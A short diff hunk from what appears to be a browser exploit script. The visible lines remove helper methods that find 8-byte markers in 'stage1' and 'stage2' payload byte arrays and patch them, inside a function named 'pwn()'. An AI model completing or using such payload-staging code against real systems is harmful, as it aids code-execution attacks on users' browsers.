@@ -373,36 +373,6 @@ function pwn() {
     }
     log(`[*] hexdump(stage1): ${hexdump(stage1)}`);
     
-    stage1.replace = function(oldVal, newVal) {
-        for (var idx = 0; idx < this.length; idx++) {
-            var found = true;
-            for (var j = idx; j < idx + 8; j++) {
-                if (this[j] != oldVal.byteAt(j - idx)) {
-                    found = false;
-                    break;
-                }
-            }
-            if (found)
-                break;
-        }
-        this.set(newVal.bytes(), idx);
-    };
-    
-    stage2.replace = function(oldVal, newVal) {
-        for (var idx = 0; idx < this.length; idx++) {
-            var found = true;
-            for (var j = idx; j < idx + 8; j++) {
-                if (this[j] != oldVal.byteAt(j - idx)) {
-                    found = false;
-                    break;
-                }
-            }
-            if (found)
-                break;
-        }
-        this.set(newVal.bytes(), idx);
-    };
-    
     function writeStringToUint8Array(str, uint8Array, offset = 0) {
         const encoder = new TextEncoder();
         const encoded = encoder.encode(str);
